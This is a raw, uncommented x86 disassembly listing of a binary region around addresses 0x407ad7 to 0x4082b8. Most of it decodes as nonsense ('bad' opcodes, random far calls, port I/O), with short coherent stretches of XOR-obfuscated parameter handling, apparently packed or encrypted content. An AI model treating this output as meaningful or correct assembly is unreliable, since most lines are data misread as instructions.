  407ad7:	jle    0x407b3f
  407ad9:	adc    eax,0x5a8be474
  407ade:	ins    DWORD PTR es:[edi],dx
  407adf:	sbb    esi,DWORD PTR [edi-0x164fa1a1]
  407ae5:	inc    edi
  407ae6:	int    0x1e
  407ae8:	stos   DWORD PTR es:[edi],eax
  407ae9:	and    bl,BYTE PTR ds:0xcfc011ed
  407aef:	repz dec ebx
  407af1:	jle    0x407aa6
  407af3:	std    
  407af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407af5:	jg     0x407b55
  407af7:	sub    al,0x2f
  407af9:	(bad)  
  407afa:	cmp    edi,ebp
  407afc:	pushf  
  407afd:	and    eax,0x645f79f7
  407b02:	inc    ebp
  407b04:	js     0x407aef
  407b06:	in     eax,0xaa
  407b08:	pop    ds
  407b09:	ins    BYTE PTR es:[edi],dx
  407b0a:	cmp    DWORD PTR [ecx-0x6],eax
  407b0d:	and    eax,0xcb7219c9
  407b12:	mov    BYTE PTR fs:[esi-0x38fc39cd],bl
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	fnstenv [ebp-0x36a82597]
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b2a
  407b4c:	in     eax,0x6c
  407b4e:	dec    edx
  407b4f:	and    eax,0x75dff2b
  407b54:	int    0x53
  407b56:	gs aas 
  407b58:	out    dx,al
  407b59:	pop    ss
  407b5a:	and    al,0x97
  407b5c:	clc    
  407b5d:	out    dx,eax
  407b5e:	int    0x44
  407b60:	and    ebx,DWORD PTR [ebx-0x7ea588ee]
  407b66:	jge    0x407b8a
  407b68:	into   
  407b69:	push   esp
  407b6a:	and    DWORD PTR [eax-0x5c],ecx
  407b6d:	pop    ecx
  407b6e:	pop    eax
  407b6f:	or     eax,0xdce4e964
  407b74:	add    al,0xcf
  407b76:	bound  esi,QWORD PTR [eax+0x77]
  407b79:	outs   dx,BYTE PTR ds:[esi]
  407b7a:	mov    edx,0xd3624e40
  407b7f:	call   0x3c4:0xd758a05c
  407b86:	fdivr  QWORD PTR [edx]
  407b88:	fbstp  TBYTE PTR [edx]
  407b8a:	rcl    BYTE PTR [esi+0x1d],cl
  407b8d:	int    0xf2
  407b8f:	push   0xffffffb5
  407b91:	lock cmc 
  407b93:	pop    ss
  407b94:	inc    edx
  407b95:	sub    bh,BYTE PTR [esi+0xa]
  407b98:	es ins BYTE PTR es:[edi],dx
  407b9a:	pop    ecx
  407b9b:	call   FWORD PTR ds:0x5489fc9b
  407ba1:	loope  0x407b82
  407ba3:	inc    esp
  407ba4:	cmp    eax,0x6b3382f1
  407ba9:	add    cl,BYTE PTR [esi+0x29]
  407bac:	rcr    esp,0x51
  407baf:	sbb    al,ch
  407bb1:	cmc    
  407bb2:	mov    al,ds:0x11998316
  407bb7:	stc    
  407bb8:	cmc    
  407bb9:	stc    
  407bba:	mov    bl,0x82
  407bbc:	mov    dh,0x1b
  407bbe:	popf   
  407bbf:	ret    0x51a6
  407bc2:	sub    DWORD PTR [esi+0x7147054c],0xffffffda
  407bc9:	imul   edx,DWORD PTR [eiz*1-0xfd7cad3],0x9fad6c48
  407bd4:	outs   dx,DWORD PTR ds:[esi]
  407bd5:	ficomp DWORD PTR ds:0x7e37eacd
  407bdb:	mov    ecx,0xf4ad210f
  407be0:	cmp    edi,ebx
  407be2:	data16 shr BYTE PTR [esi-0x1e78d7b5],0x93
  407bea:	pop    eax
  407beb:	cmp    BYTE PTR [eax-0x1470e766],cl
  407bf1:	pop    ecx
  407bf2:	push   edi
  407bf3:	jecxz  0x407c66
  407bf5:	mov    bh,0xf6
  407bf7:	or     eax,0x6dba5a12
  407bfc:	jne    0x407c01
  407bfe:	pop    ebp
  407bff:	sub    BYTE PTR [ebp-0x3772f63d],ah
  407c05:	jl     0x407c76
  407c07:	(bad)  
  407c09:	and    DWORD PTR [edx],esp
  407c0b:	xor    DWORD PTR [esi+eax*8-0x55],ecx
  407c0f:	push   eax
  407c10:	hlt    
  407c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c12:	(bad)  
  407c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c14:	xlat   BYTE PTR ds:[ebx]
  407c15:	pop    ds
  407c16:	rcr    BYTE PTR [esi+0x3fda9cd3],cl
  407c1c:	loope  0x407c40
  407c1e:	pop    edi
  407c1f:	mov    ch,0xc3
  407c21:	iret   
  407c22:	xor    DWORD PTR [ecx+0x45],esp
  407c25:	mov    ch,0xd4
  407c27:	add    BYTE PTR [edi+0x8],0x73
  407c2b:	lea    edx,[edi+0x614fb036]
  407c31:	sub    ah,BYTE PTR [ecx]
  407c33:	or     BYTE PTR [ebx+0x4af9ef7a],dl
  407c39:	cmp    esi,DWORD PTR [edx+0x53]
  407c3c:	fadd   DWORD PTR [esi-0x5a]
  407c3f:	mov    bl,0xa4
  407c41:	ror    DWORD PTR [ebx],cl
  407c43:	ja     0x407c30
  407c45:	stc    
  407c46:	test   DWORD PTR [edx-0x4dd15a11],ebx
  407c4c:	adc    DWORD PTR [edi+0x4819f6a9],edi
  407c52:	pusha  
  407c53:	sbb    al,0xff
  407c55:	and    DWORD PTR [eax],0x52bf9207
  407c5b:	enter  0x46f7,0x95
  407c5f:	(bad)  
  407c60:	das    
  407c61:	inc    ebp
  407c62:	(bad)  
  407c63:	jnp    0x407c96
  407c65:	mov    gs,edi
  407c67:	daa    
  407c68:	sub    DWORD PTR [edx+0x70],0x48
  407c6c:	sub    al,0x95
  407c6e:	and    esi,DWORD PTR [eax]
  407c70:	jmp    0x2c06:0x1f653dca
  407c77:	inc    ebx
  407c78:	imul   esi,DWORD PTR [edi-0x540dff2a],0xffffffa2
  407c7f:	add    eax,0x14d4c744
  407c84:	out    dx,eax
  407c85:	ss push ss
  407c87:	jmp    0xaf4ccfc1
  407c8c:	push   0xcb5427eb
  407c91:	jg     0x407c57
  407c93:	fmul   st(3),st
  407c95:	imul   ecx,edx,0xfffffff0
  407c98:	mul    DWORD PTR [eax-0x459d588]
  407c9e:	enter  0x8fa,0x57
  407ca2:	fs jl  0x407c81
  407ca5:	arpl   sp,sp
  407ca7:	adc    eax,0xc32a10f0
  407cac:	sbb    ah,BYTE PTR [esi-0x2e19acf7]
  407cb2:	int    0x20
  407cb4:	xor    eax,0xc856cad2
  407cb9:	mov    cl,0x8
  407cbb:	jle    0x407cac
  407cbd:	and    DWORD PTR [eax],edi
  407cbf:	leave  
  407cc0:	mov    edi,0x94bb817
  407cc5:	push   ebx
  407cc6:	cs pop ds
  407cc8:	cmp    esi,esi
  407cca:	pop    ds
  407ccb:	xor    edi,DWORD PTR [ecx]
  407ccd:	mov    eax,0xde667b25
  407cd2:	mov    eax,ds:0x735eaea1
  407cd7:	fxam   
  407cd9:	test   al,0x26
  407cdb:	inc    eax
  407cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cdd:	aad    0xf5
  407cdf:	push   esi
  407ce0:	mov    cl,0x42
  407ce2:	call   0x30d3:0x640d3988
  407ce9:	xchg   DWORD PTR [ebp-0x1e],edi
  407cec:	lea    edi,[ecx-0x6c081f54]
  407cf2:	test   DWORD PTR [esp+eax*2+0x6],0xfa6e6fc0
  407cfa:	stc    
  407cfb:	inc    ecx
  407cfc:	outs   dx,BYTE PTR ds:[esi]
  407cfd:	xor    eax,0x79ce4627
  407d02:	stc    
  407d03:	call   0xc2b7:0x745f056f
  407d0a:	mov    ds,WORD PTR [ebp+0x205e9bee]
  407d10:	sub    esi,DWORD PTR [eax+eiz*8-0x76]
  407d14:	dec    ecx
  407d15:	inc    ebx
  407d16:	pop    ebp
  407d17:	push   ds
  407d18:	jg     0x407d91
  407d1a:	push   es
  407d1b:	loope  0x407d0e
  407d1d:	out    dx,al
  407d1e:	mov    ss,WORD PTR [bp-0x1678]
  407d23:	xchg   DWORD PTR [ebp-0x12],edi
  407d26:	pop    esp
  407d27:	and    ebx,DWORD PTR [ebp+0x4f739bf4]
  407d2d:	pop    esi
  407d2e:	and    bl,BYTE PTR [edx]
  407d30:	push   eax
  407d31:	and    DWORD PTR [ecx-0x562a28f3],esi
  407d37:	mov    esp,0x47588713
  407d3c:	aad    0xbf
  407d3e:	adc    BYTE PTR [esi+0x60aee291],ah
  407d44:	push   esp
  407d45:	cmp    BYTE PTR [esp+ebp*1+0x4dea1723],dh
  407d4c:	push   ecx
  407d4d:	xor    bh,BYTE PTR ds:0xaf6e243e
  407d53:	push   DWORD PTR [ecx+ebx*1]
  407d56:	push   0x55
  407d58:	cs fs (bad) 
  407d5b:	aad    0x91
  407d5d:	cmp    esi,esp
  407d5f:	retf   0x89d6
  407d62:	mov    ch,0x80
  407d64:	mov    bl,0x36
  407d66:	jne    0x407d0b
  407d68:	jae    0x407d4d
  407d6a:	pop    ebp
  407d6b:	fld    QWORD PTR [eax+0x4f080d6f]
  407d71:	loopne 0x407d90
  407d73:	jb     0x407d1a
  407d75:	in     eax,0x71
  407d77:	aam    0x55
  407d79:	aam    0xe1
  407d7b:	(bad)  
  407d7c:	popf   
  407d7d:	push   esi
  407d7e:	inc    ebx
  407d7f:	ja     0x407d12
  407d81:	xor    ch,BYTE PTR [ebx]
  407d83:	inc    edx
  407d84:	bound  esp,QWORD PTR [ecx]
  407d86:	(bad)  
  407d87:	fld    QWORD PTR [eax+0x7295341]
  407d8d:	cmp    al,0xb1
  407d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d90:	cli    
  407d91:	out    dx,eax
  407d92:	xor    ecx,DWORD PTR [esi+0x632b3f27]
  407d98:	out    dx,al
  407d99:	addr16 push cs
  407d9b:	adc    DWORD PTR [esi],esp
  407d9d:	fcom   QWORD PTR [ebp+0x73]
  407da0:	sahf   
  407da1:	or     edi,DWORD PTR [ecx+0x6a]
  407da4:	jbe    0x407dfc
  407da6:	daa    
  407da7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407da8:	out    0xe7,al
  407daa:	mov    ds:0x89fbaae8,al
  407daf:	sub    al,0xd0
  407db1:	or     DWORD PTR [ecx-0x2b103666],ebx
  407db7:	mov    bh,0x9f
  407db9:	ds fwait
  407dbb:	jge    0x407e0c
  407dbd:	test   al,0x74
  407dbf:	cld    
  407dc0:	mov    dh,0xb4
  407dc2:	sub    ebx,ebx
  407dc4:	loop   0x407d71
  407dc6:	mov    eax,es:0x87365916
  407dcc:	jmp    0x66a4:0x16b5bcb7
  407dd3:	clc    
  407dd4:	ja     0x407d7d
  407dd6:	mov    ds:0xe2c8dc77,eax
  407ddb:	mov    ecx,DWORD PTR [ecx+0xfed3958]
  407de1:	push   edx
  407de2:	ret    
  407de3:	popf   
  407de4:	cmp    eax,0x49f8e1b1
  407de9:	sub    eax,0xa7755afe
  407dee:	fimul  DWORD PTR [eax]
  407df0:	fadd   DWORD PTR [edi-0x24]
  407df3:	test   al,0x4
  407df5:	inc    esp
  407df6:	xchg   edi,eax
  407df7:	push   ds
  407df8:	jle    0x407dc2
  407dfa:	add    ecx,DWORD PTR [edx]
  407dfc:	push   esp
  407dfd:	mov    bh,0x52
  407dff:	push   edx
  407e00:	or     al,0x2a
  407e02:	aas    
  407e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e04:	mov    esi,DWORD PTR [eax+0x6b]
  407e07:	(bad)  
  407e08:	call   0xdc6586fd
  407e0d:	leave  
  407e0e:	sahf   
  407e0f:	add    dh,BYTE PTR [edi-0x1f273407]
  407e15:	aad    0xb1
  407e17:	fimul  DWORD PTR [eax+0x3a8dab13]
  407e1d:	int3   
  407e1e:	je     0x407e30
  407e20:	inc    eax
  407e21:	jg     0x407e85
  407e23:	retf   
  407e24:	addr16 repz loop 0x407e6a
  407e28:	mov    esp,0xc4ef252c
  407e2d:	push   ebp
  407e2e:	mov    dh,0x6a
  407e30:	out    0x5b,al
  407e32:	inc    ebx
  407e33:	retf   0x2a99
  407e36:	mov    BYTE PTR [ecx+eiz*8-0x61],dh
  407e3a:	jmp    0xabae02b
  407e3f:	push   ebx
  407e40:	jae    0x407dc6
  407e42:	loope  0x407e3e
  407e44:	ficom  DWORD PTR [esi]
  407e46:	pushf  
  407e47:	pushf  
  407e48:	mov    dh,0xf7
  407e4a:	outs   dx,DWORD PTR ds:[esi]
  407e4b:	sub    DWORD PTR [ebp-0x68],esp
  407e4e:	popf   
  407e4f:	inc    ecx
  407e50:	jecxz  0x407e67
  407e52:	push   esi
  407e53:	mov    ch,0x44
  407e55:	mov    edi,0x8fa93ff
  407e5a:	es dec edx
  407e5c:	scas   al,BYTE PTR es:[edi]
  407e5d:	add    ebp,DWORD PTR [esi-0x564ef3dd]
  407e63:	inc    ebp
  407e64:	and    ch,ah
  407e66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e67:	ja     0x407e9a
  407e69:	adc    DWORD PTR [esi+0x3f],esp
  407e6c:	xor    eax,0xbd233f13
  407e71:	jnp    0x407ebe
  407e73:	aam    0xa7
  407e75:	dec    edi
  407e76:	rcr    esi,cl
  407e78:	out    0xde,al
  407e7a:	mov    ch,al
  407e7c:	cmp    esp,DWORD PTR [edx+0x45890000]
  407e82:	clc    
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	aaa    
  407e99:	ins    BYTE PTR es:[edi],dx
  407e9a:	imul   esi,DWORD PTR [edi+0x7],0x207070d5
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407ef7
  407ea5:	aas    
  407ea6:	outs   dx,DWORD PTR ds:[esi]
  407ea7:	pop    esp
  407ea8:	adc    DWORD PTR [ebx+0x4eea51ed],0xffffffa6
  407eaf:	lods   eax,DWORD PTR ds:[esi]
  407eb0:	dec    esi
  407eb1:	retf   0x1d47
  407eb4:	pop    edx
  407eb5:	adc    al,0x1a
  407eb7:	xchg   BYTE PTR [edi],bh
  407eb9:	adc    BYTE PTR [edx],bh
  407ebb:	pop    eax
  407ebc:	ficom  WORD PTR [edx+0x20]
  407ebf:	mov    ebx,0xa5ae91a2
  407ec4:	dec    ebx
  407ec5:	add    al,0xec
  407ec7:	lahf   
  407ec8:	lock pop ss
  407eca:	pop    edi
  407ecb:	inc    esp
  407ecc:	jmp    0x407e75
  407ece:	(bad)  
  407ecf:	fst    st(1)
  407ed1:	pusha  
  407ed2:	sub    bl,ah
  407ed4:	xor    ah,cl
  407ed6:	pop    ecx
  407ed7:	std    
  407ed8:	or     edi,DWORD PTR [esi+ebx*1]
  407edb:	sub    DWORD PTR [eax+0x16d256c2],ecx
  407ee1:	xchg   edi,eax
  407ee2:	jae    0x407e66
  407ee4:	in     eax,dx
  407ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ee6:	adc    ah,BYTE PTR [ecx]
  407ee8:	int3   
  407ee9:	call   0xa4835860
  407eee:	mov    bh,0x63
  407ef0:	xor    eax,0xdd638c28
  407ef5:	out    dx,al
  407ef6:	rcr    DWORD PTR [edi-0x287e09be],cl
  407efc:	(bad)  
  407efd:	pushf  
  407efe:	repnz ror BYTE PTR [ebx+0x48cef5c2],0xe0
  407f06:	repnz push 0x9dfb22bc
  407f0c:	leave  
  407f0d:	lods   al,BYTE PTR ds:[esi]
  407f0e:	xor    al,0x35
  407f10:	(bad)
  407f14:	mov    ds:0x23ff13b,eax
  407f19:	jge    0x407f3a
  407f1b:	mov    bh,0x74
  407f1d:	push   ecx
  407f1e:	or     bl,cl
  407f20:	in     al,dx
  407f21:	jmp    0x94bbf0e7
  407f26:	add    al,BYTE PTR ds:0x97cd55bc
  407f2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f2d:	or     eax,0xce3761ce
  407f32:	pop    ds
  407f33:	test   al,0xb5
  407f35:	push   ebp
  407f36:	sub    DWORD PTR [eax+ebp*2],0x52
  407f3a:	sbb    eax,0x39ea761e
  407f3f:	xor    eax,0xa170e52f
  407f44:	sahf   
  407f45:	fdivrp st(1),st
  407f47:	cwde   
  407f48:	cmp    DWORD PTR [eax],esp
  407f4a:	mov    esp,0x949f5387
  407f4f:	push   es
  407f50:	or     al,0x8d
  407f52:	pop    ecx
  407f53:	inc    ebp
  407f54:	iret   
  407f55:	xchg   esp,eax
  407f56:	out    dx,eax
  407f57:	js     0x407f55
  407f59:	sahf   
  407f5a:	mov    ch,0x3
  407f5c:	stos   BYTE PTR es:[edi],al
  407f5d:	mov    cl,0x16
  407f5f:	or     cl,al
  407f61:	push   ecx
  407f62:	push   ebx
  407f63:	push   eax
  407f64:	adc    bh,bh
  407f66:	cmp    eax,0x2c465707
  407f6b:	xchg   edi,ebp
  407f6d:	sti    
  407f6e:	push   ebx
  407f6f:	fbstp  TBYTE PTR [eax+0x12f9a104]
  407f75:	js     0x407f17
  407f77:	xor    edi,DWORD PTR [eax-0x41]
  407f7a:	out    0xa9,eax
  407f7c:	and    DWORD PTR [esi-0x579ebac4],edi
  407f82:	cmc    
  407f83:	dec    edx
  407f84:	jbe    0x407fa5
  407f86:	cmp    ch,bh
  407f88:	xor    DWORD PTR [edi],edi
  407f8a:	leave  
  407f8b:	push   esp
  407f8c:	cmp    DWORD PTR [edx],ebp
  407f8e:	jge    0x407f4f
  407f90:	out    dx,al
  407f91:	push   esp
  407f92:	or     DWORD PTR [edi+0x14de6f20],ebx
  407f98:	stc    
  407f99:	xor    esp,DWORD PTR [ebp+ebx*8+0x2]
  407f9d:	aam    0x83
  407f9f:	shl    DWORD PTR [ebx+ecx*8],1
  407fa2:	pop    ecx
  407fa3:	stos   BYTE PTR es:[edi],al
  407fa4:	aas    
  407fa5:	mov    esi,0xbf491d8b
  407faa:	es adc eax,0x859d6422
  407fb0:	call   0x27e7:0x82a74ea
  407fb7:	sub    ecx,DWORD PTR [edx]
  407fb9:	pop    edi
  407fba:	mov    bl,0x5f
  407fbc:	or     eax,0x86fbcd6f
  407fc1:	scas   eax,DWORD PTR es:[edi]
  407fc2:	lods   al,BYTE PTR ds:[esi]
  407fc3:	adc    edi,DWORD PTR [edi]
  407fc5:	cdq    
  407fc6:	retf   
  407fc7:	add    BYTE PTR [ebx],cl
  407fc9:	mov    WORD PTR [eax+0x609ee302],ss
  407fcf:	or     BYTE PTR [ecx+0x22],ah
  407fd2:	adc    eax,0x1e3dde4e
  407fd7:	add    edx,DWORD PTR [esi+0x340ec4c9]
  407fdd:	(bad)  
  407fdf:	mov    ch,0x18
  407fe1:	fwait
  407fe2:	int3   
  407fe3:	imul   edx,DWORD PTR [ebx-0x2a924128],0xffffffb4
  407fea:	stc    
  407feb:	adc    edi,DWORD PTR [edx-0x43]
  407fee:	cwde   
  407fef:	sub    dl,ch
  407ff1:	repz and DWORD PTR [edx+edx*1-0x3bc3026],0x69f1a5c0
  407ffd:	adc    al,bl
  407fff:	repnz mov esp,0xf7d02517
  408005:	xor    edi,DWORD PTR [ecx+0x21559826]
  40800b:	pop    edi
  40800c:	push   esp
  40800d:	mov    ebp,0xec78a0c9
  408012:	push   esi
  408013:	out    0x3f,al
  408015:	and    eax,0x35de6efa
  40801a:	call   0xdc7c577d
  40801f:	xchg   edx,eax
  408020:	mov    esi,0x79669b5
  408025:	jne    0x40803f
  408027:	fiadd  WORD PTR [ecx]
  408029:	outs   dx,BYTE PTR ds:[esi]
  40802a:	jge    0x40801d
  40802c:	adc    DWORD PTR [edi-0x671bb229],ecx
  408032:	jp     0x4080a8
  408034:	pop    edx
  408035:	sti    
  408036:	in     al,0x8e
  408038:	cmp    ebx,ecx
  40803a:	xchg   ebx,eax
  40803b:	pushf  
  40803c:	into   
  40803d:	idiv   dh
  40803f:	jp     0x407fd0
  408041:	mov    edx,0x2ec93090
  408046:	or     DWORD PTR [ecx+ebp*1],ebx
  408049:	cmc    
  40804a:	std    
  40804b:	popf   
  40804c:	mov    edx,0x26fb805a
  408051:	mov    cl,0x3f
  408053:	dec    ecx
  408054:	nop
  408055:	fs pop edi
  408057:	and    al,0x49
  408059:	sub    ch,BYTE PTR [edx]
  40805b:	push   0x73
  40805d:	(bad)  
  40805f:	pusha  
  408060:	int3   
  408061:	adc    eax,ebp
  408063:	mov    al,ds:0x94f96957
  408068:	jmp    0x40803f
  40806a:	and    DWORD PTR [edx-0x7ae2f75a],esp
  408070:	pop    ecx
  408071:	jbe    0x40802f
  408073:	or     BYTE PTR [ebx-0xf],bl
  408076:	ins    DWORD PTR es:[edi],dx
  408077:	test   eax,0x583ef7b7
  40807c:	rcr    BYTE PTR [edx],0xe4
  40807f:	pop    esi
  408080:	bnd ret 
  408082:	cmc    
  408083:	scas   eax,DWORD PTR es:[edi]
  408084:	and    edi,DWORD PTR [edx]
  408086:	and    al,0x66
  408088:	push   0x44c17645
  40808d:	jns    0x4080bc
  40808f:	pop    eax
  408090:	sub    DWORD PTR [ebx+0x21],esi
  408093:	pop    edx
  408094:	int    0x55
  408096:	ror    DWORD PTR [edi+0x5837b182],cl
  40809c:	xchg   ebp,eax
  40809d:	mov    ?,WORD PTR [eax+0x79]
  4080a0:	xchg   BYTE PTR ds:0xa3295e4a,bh
  4080a6:	dec    esi
  4080a7:	mov    ah,0x3d
  4080a9:	sub    DWORD PTR [ebx+esi*4-0x65],0x23
  4080ae:	(bad)  
  4080af:	std    
  4080b0:	dec    ecx
  4080b1:	shr    al,1
  4080b3:	pop    es
  4080b4:	nop
  4080b5:	fld    QWORD PTR [ecx-0x1f]
  4080b8:	test   eax,0xde1cea82
  4080bd:	cmp    ecx,0xfffffff0
  4080c0:	stos   DWORD PTR es:[edi],eax
  4080c1:	lods   eax,DWORD PTR ds:[esi]
  4080c2:	xlat   BYTE PTR ds:[ebx]
  4080c3:	aad    0x2b
  4080c5:	pop    ds
  4080c6:	xchg   esp,eax
  4080c7:	mov    edi,0x30df1095
  4080cc:	or     DWORD PTR [ebp-0x26],0x4e68c756
  4080d3:	mov    eax,ds:0x5216fc45
  4080d8:	lods   eax,DWORD PTR ds:[esi]
  4080d9:	mov    esi,0x6aea66f3
  4080de:	(bad)  
  4080df:	xchg   ebp,eax
  4080e0:	push   0x5c
  4080e2:	rcr    ebx,1
  4080e4:	aaa    
  4080e5:	repz jge 0x40813f
  4080e8:	xlat   BYTE PTR ds:[ebx]
  4080e9:	cmp    al,0xb6
  4080eb:	dec    edx
  4080ec:	in     eax,dx
  4080ed:	mov    ecx,ebx
  4080ef:	mov    BYTE PTR [ebx+0x35],ah
  4080f2:	dec    eax
  4080f3:	ins    BYTE PTR es:[edi],dx
  4080f4:	div    BYTE PTR ds:0x6f177631
  4080fa:	or     al,0x48
  4080fc:	hlt    
  4080fd:	and    BYTE PTR [edx+0x6f],dh
  408100:	cmp    DWORD PTR [edi+0x63],eax
  408103:	sub    al,0x71
  408105:	lds    esi,FWORD PTR [ecx-0x33]
  408108:	inc    esp
  408109:	adc    eax,0x630174eb
  40810e:	adc    al,0xcb
  408110:	lahf   
  408111:	jmp    0xd925:0xc0aa42a2
  408118:	test   DWORD PTR [ecx],0x9c4cf505
  40811e:	xlat   BYTE PTR ds:[ebx]
  40811f:	xor    dh,dh
  408121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408122:	stc    
  408123:	cmp    BYTE PTR [edx],0xad
  408126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408127:	ret    0x7a66
  40812a:	mov    esi,0xa1a73570
  40812f:	pushf  
  408130:	sub    bh,BYTE PTR [ecx]
  408132:	dec    eax
  408133:	sbb    eax,0x14daa9b1
  408138:	(bad)  
  408139:	aaa    
  40813a:	mov    bh,0xb1
  40813c:	pusha  
  40813d:	rol    DWORD PTR [esi],0x88
  408140:	mov    cl,0x66
  408142:	retf   0x38b
  408145:	hlt    
  408146:	arpl   WORD PTR [ebp+0x3b2184e7],bx
  40814c:	mov    bh,0xca
  40814e:	sbb    ecx,ecx
  408150:	mov    DWORD PTR [ebx+0x54],esi
  408153:	lods   eax,DWORD PTR ds:[esi]
  408154:	loop   0x408172
  408156:	imul   esi,ebp,0x5db547b6
  40815c:	ins    BYTE PTR es:[edi],dx
  40815d:	out    dx,al
  40815e:	pusha  
  40815f:	pop    eax
  408160:	aaa    
  408161:	neg    edi
  408163:	cmp    al,0xf4
  408165:	(bad)  
  408166:	repz mov al,0xa8
  408169:	rdtsc  
  40816b:	jne    0x4081a2
  40816d:	cwde   
  40816e:	or     al,0x8f
  408170:	(bad)  
  408171:	push   ss
  408172:	dec    edx
  408173:	xchg   edi,eax
  408174:	popa   
  408175:	retf   0x1dba
  408178:	(bad)  
  408179:	or     eax,0x1e377622
  40817e:	ds cs into 
  408181:	(bad)  
  408182:	xor    eax,0x53fb9108
  408187:	cdq    
  408188:	call   0xbd8eeaef
  40818d:	adc    dh,bh
  40818f:	push   ebp
  408190:	xor    ebx,DWORD PTR [esi]
  408192:	cmp    eax,0xcf467fd4
  408197:	call   0x918c:0xa95f6ff9
  40819e:	fiadd  DWORD PTR [ebx]
  4081a0:	sbb    edi,DWORD PTR [edi]
  4081a2:	hlt    
  4081a3:	sub    al,0x8
  4081a5:	push   ds
  4081a6:	cmp    esi,DWORD PTR ds:0x521e74eb
  4081ac:	shr    BYTE PTR ds:0xfc1d87ed,1
  4081b2:	pop    ebp
  4081b3:	inc    esp
  4081b4:	jo     0x40818b
  4081b6:	push   cs
  4081b7:	push   es
  4081b8:	and    bl,BYTE PTR [ecx+0x316b550d]
  4081be:	mov    al,ds:0xa6073ea5
  4081c3:	ja     0x40815d
  4081c5:	out    0xb2,al
  4081c7:	call   0xea11ae47
  4081cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081cd:	xchg   edi,eax
  4081ce:	imul   cl
  4081d0:	add    BYTE PTR [ecx+0x1a],dh
  4081d3:	fmul   DWORD PTR [ebp+0x45890445]
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	mov    tr0,esi
  40826b:	cs aaa 
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x4082f3
  408275:	mov    ah,0xb6
  408277:	dec    edi
  408278:	shl    BYTE PTR [ecx-0x768cd6dc],cl
  40827e:	push   cs
  40827f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  408281:	jns    0x4082a7
  408283:	popf   
  408284:	and    BYTE PTR [esi+edx*1-0x50a339d9],0x1d
  40828c:	mov    ebp,0x597a181f
  408291:	cmp    BYTE PTR [ebp+0x38765b07],bh
  408297:	xor    bl,BYTE PTR [esi-0x52]
  40829a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40829b:	xchg   ebp,eax
  40829c:	adc    al,BYTE PTR [bp+si]
  40829f:	push   ebx
  4082a0:	mov    ds:0xdd85c78e,al
  4082a5:	cmp    bh,0xc4
  4082a8:	jl     0x40829c
  4082aa:	test   al,0x61
  4082ac:	fst    QWORD PTR [ebx]
  4082ae:	push   0x42ea2aa3
  4082b3:	xor    eax,DWORD PTR [edx+0x77]
  4082b6:	rol    dh,cl
  4082b8:	setns  BYTE PTR [ebp-0x3ee24783]
